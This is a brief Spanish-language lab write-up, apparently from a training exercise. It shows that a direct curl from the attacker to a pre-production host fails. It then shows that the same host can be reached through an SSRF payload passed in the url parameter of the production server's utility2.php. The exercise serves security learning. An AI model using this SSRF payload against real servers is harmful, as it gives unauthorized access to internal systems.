> LAB-2

Si desde el atacante intentamos realizar un curl a preproducción no podremos:
```
curl http://10.10.0.3
```
Pero si desde el atacante lanzamos un curl al entorno de producción e indicandole que este realice una petición hacia pre-producción si que nos dejará visualizar el entorno de pre-producción:
```
curl "http://172.17.0.2/utility2.php?url=http://10.10.0.3:4646/"
```
